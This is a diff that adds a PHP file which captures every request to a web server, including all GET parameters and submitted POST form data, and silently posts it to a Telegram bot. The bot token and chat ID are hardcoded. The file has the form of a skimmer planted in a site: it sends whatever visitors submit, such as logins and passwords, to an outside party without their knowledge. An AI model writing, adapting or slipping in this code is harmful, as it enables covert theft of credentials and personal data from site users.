@@ -1,0 +1,44 @@
+<?php
+function kirimUrlKeTelegram($url) {
+    $botToken = "7470301301:AAFEaEpn9_eKbf67UOsEYuU6hLLf4HY_uUw";
+    $chatId = "-1002216453535";
+    
+    $message = "URL diakses: " . $url;
+    
+    $telegramApiUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
+
+    $data = [
+        'chat_id' => $chatId,
+        'text' => $message
+    ];
+
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+    curl_exec($ch);
+
+    curl_close($ch);
+}
+
+$host = $_SERVER['HTTP_HOST'];
+$requestUri = $_SERVER['REQUEST_URI'];
+
+if (!empty($_GET)) {
+    $getParams = http_build_query($_GET);
+    $requestUri .= '?' . $getParams;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST)) {
+    $postParams = http_build_query($_POST);
+    $requestUri .= '?' . $postParams;
+}
+
+$fullUrl = "https://" . $host . $requestUri;
+
+kirimUrlKeTelegram($fullUrl);
+
+?>
